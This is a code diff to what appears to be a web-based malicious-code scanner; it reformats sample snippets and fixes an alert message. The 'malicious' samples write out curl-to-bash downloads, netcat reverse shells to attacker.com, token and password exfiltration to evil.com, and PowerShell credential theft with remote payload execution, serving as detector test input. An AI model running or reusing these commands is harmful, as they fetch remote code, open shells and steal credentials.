@@ -704,24 +704,83 @@
         };
 
         // Sample code snippets - FIXED: removed markdown link syntax
-        const SAMPLE_CODE = {
+        // Sample code snippets — FIXED: removed markdown link syntax
+const SAMPLE_CODE = {
             python: {
-                clean: 'def analyze_data(df):\n    """Safe data analysis function"""\n    return df.describe()\n\n# Calculate statistics\nmean_value = df["column"].mean()\nprint(f"Mean: {mean_value}")',
-                malicious: 'import os\nimport subprocess\n\n# Backdoor installation\nos.system("curl http://evil.com/malware.sh | bash")\nsubprocess.call(["nc", "attacker.com", "4444", "-e", "/bin/sh"])'
+                clean:
+                    'def analyze_data(df):\n' +
+                    '    """Safe data analysis function"""\n' +
+                    '    return df.describe()\n\n' +
+                    '# Calculate statistics\n' +
+                    'mean_value = df["column"].mean()\n' +
+                    'print(f"Mean: {mean_value}")',
+
+                malicious:
+                    'import os\n' +
+                    'import subprocess\n\n' +
+                    '# Backdoor installation\n' +
+                    'os.system("curl http://evil.com/malware.sh | bash")\n' +
+                    'subprocess.call(["nc", "attacker.com", "4444", "-e", "/bin/sh"])'
             },
+
             javascript: {
-                clean: 'function validateInput(input) {\n    const trimmed = input.trim();\n    return trimmed.length > 0;\n}\n\n// Process user data safely\nconst result = validateInput(userInput);',
-                malicious: '// Steal authentication tokens\nfetch("http://evil.com/steal", {\n    method: "POST",\n    body: JSON.stringify({\n        token: localStorage.getItem("auth"),\n        password: document.getElementById("pwd").value\n    })\n});\n\n// Execute obfuscated code\neval(atob("bWFsaWNpb3VzIGNvZGU="));'
+                clean:
+                    'function validateInput(input) {\n' +
+                    '    const trimmed = input.trim();\n' +
+                    '    return trimmed.length > 0;\n' +
+                    '}\n\n' +
+                    '// Process user data safely\n' +
+                    'const result = validateInput(userInput);',
+
+                malicious:
+                    '// Steal authentication tokens\n' +
+                    'fetch("http://evil.com/steal", {\n' +
+                    '    method: "POST",\n' +
+                    '    body: JSON.stringify({\n' +
+                    '        token: localStorage.getItem("auth"),\n' +
+                    '        password: document.getElementById("pwd").value\n' +
+                    '    })\n' +
+                    '});\n\n' +
+                    '// Execute obfuscated code\n' +
+                    'eval(atob("bWFsaWNpb3VzIGNvZGU="));'
             },
+
             bash: {
-                clean: '#!/bin/bash\n# Safe file backup script\nbackup_dir="/backup"\nsource_dir="/data"\n\ntar -czf "$backup_dir/backup.tar.gz" "$source_dir"\necho "Backup completed"',
-                malicious: '#!/bin/bash\n# Download and execute malware\ncurl http://evil.com/payload.sh | bash\n\n# Open reverse shell\nnc attacker.com 4444 -e /bin/bash'
+                clean:
+                    '#!/bin/bash\n' +
+                    '# Safe file backup script\n' +
+                    'backup_dir="/backup"\n' +
+                    'source_dir="/data"\n\n' +
+                    'tar -czf "$backup_dir/backup.tar.gz" "$source_dir"\n' +
+                    'echo "Backup completed"',
+
+                malicious:
+                    '#!/bin/bash\n' +
+                    '# Download and execute malware\n' +
+                    'curl http://evil.com/payload.sh | bash\n\n' +
+                    '# Open reverse shell\n' +
+                    'nc attacker.com 4444 -e /bin/bash'
             },
+
             powershell: {
-                clean: '# Safe PowerShell script\n$files = Get-ChildItem -Path "C:\\Data"\nforeach ($file in $files) {\n    Write-Host $file.Name\n}',
-                malicious: '# Exfiltrate credentials\n$creds = Get-Credential\nInvoke-WebRequest -Uri "http://evil.com/steal" -Method Post -Body $creds\n\n# Execute remote payload\nIEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
+                clean:
+                    '# Safe PowerShell script\n' +
+                    '$files = Get-ChildItem -Path "C:\\Data"\n' +
+                    'foreach ($file in $files) {\n' +
+                    '    Write-Host $file.Name\n' +
+                    '}',
+
+                malicious:
+                    '# Exfiltrate credentials\n' +
+                    '$creds = Get-Credential\n' +
+                    'Invoke-WebRequest -Uri "http://evil.com/steal" -Method Post -Body $creds\n\n' +
+                    '# Execute remote payload\n' +
+                    'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
             }
         };
+
+
+        
 
         // POLICY HANDLERS
         document.querySelectorAll('[data-policy]').forEach(toggle => {
@@ -828,8 +887,8 @@
             const matches = [...response.matchAll(codeBlockRegex)];
 
             if (matches.length === 0) {
-                alert('No code blocks found. Make sure to use triple backticks (```
-                return;
+                  alert('No code blocks found. Make sure to use triple backticks');
+                    return;
             }
 
             matches.forEach((match, index) => {
